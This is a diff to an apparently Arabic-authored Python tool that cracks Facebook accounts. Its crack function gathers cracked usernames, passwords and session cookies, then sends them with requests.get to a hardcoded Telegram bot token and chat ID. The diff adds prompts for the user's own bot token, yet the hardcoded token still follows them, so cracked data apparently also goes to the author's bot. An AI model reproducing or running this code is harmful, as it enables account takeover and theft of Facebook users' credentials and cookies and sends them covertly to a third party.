@@ -22,7 +22,7 @@ if (x.strftime("%x"))>(g.strftime("%x")):
  time.sleep(1)
  print('\033[1;31m المطور نادر @Q_B_h')
  time.sleep(1)
- print('\033[1;32m شروحات نادر')
+print('\033[1;32m شروحات نادر')
  time.sleep(1)
  print('\033[1;31m 1')
  time.sleep(1)
@@ -90,6 +90,8 @@ B = '\033[2;36m'
 G = '\033[1;32m'
 S = '\033[1;33m'
 print('\n')
+Nader=input('\033[1;32mtoken:ادخل توكن بوتك: ') 
+Nnn=input('\033[1;32mID:ادخل ايدي بوتك تلجرام: ') 
 token=('6428563721:AAG4sOU4onVks2yjDK4z9O1PFEr3C3egPjM')
 print('\n')
 ID=('1350971290')
@@ -1142,6 +1144,10 @@ def crack(idf,pwv):
 ⋘─────━𓆩NADER𓆪‏━─────⋙
 ❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
 ❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
+<><><><><><><><><><>>><>
+❖ -𝐂𝐎𝐎𝐊𝐈𝐄 :{kuki}
+❖ -𝐋𝐈𝐍𝐊 : https://www.facebook.com/profile.php?id={idf}&mibextid=ZbWKwL
+❖ -[✓]ID : tg://openmessage?user_id={Nnn}
 ⋘─────━𓆩NADER𓆪‏━─────⋙
 @nader20090  -  @N_0_N_7					
 					'''
@@ -1164,6 +1170,9 @@ def crack(idf,pwv):
 ⋘─────━𓆩NADER𓆪‏━─────⋙
 ❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
 ❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
+❖ -𝐂𝐎𝐎𝐊𝐈𝐄 :{kuki}
+❖ -𝐋𝐈𝐍𝐊 : https://www.facebook.com/profile.php?id={idf}&mibextid=ZbWKwL
+❖ -[✓]ID : tg://openmessage?user_id={Nnn}
 ⋘─────━𓆩NADER𓆪‏━─────⋙
 @nader20090  -  @N_0_N_7					
 					'''
@@ -1204,7 +1213,9 @@ def crack(idf,pwv):
 
 					infoakun += f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺
 ⋘─────━𓆩NADER𓆪‏━─────⋙
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n⋘─────━𓆩NADER𓆪‏━─────⋙
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n❖ -𝐂𝐎𝐎𝐊𝐈𝐄 :{kuki}
+\n❖ -𝐋𝐈𝐍𝐊 : https://www.facebook.com/profile.php?id={idf}&mibextid=ZbWKwL
+\n❖ -[✓]ID : tg://openmessage?user_id={Nnn}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n⋘─────━𓆩NADER𓆪‏━─────⋙
 @nader20090  -  @N_0_N_7'''
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
 
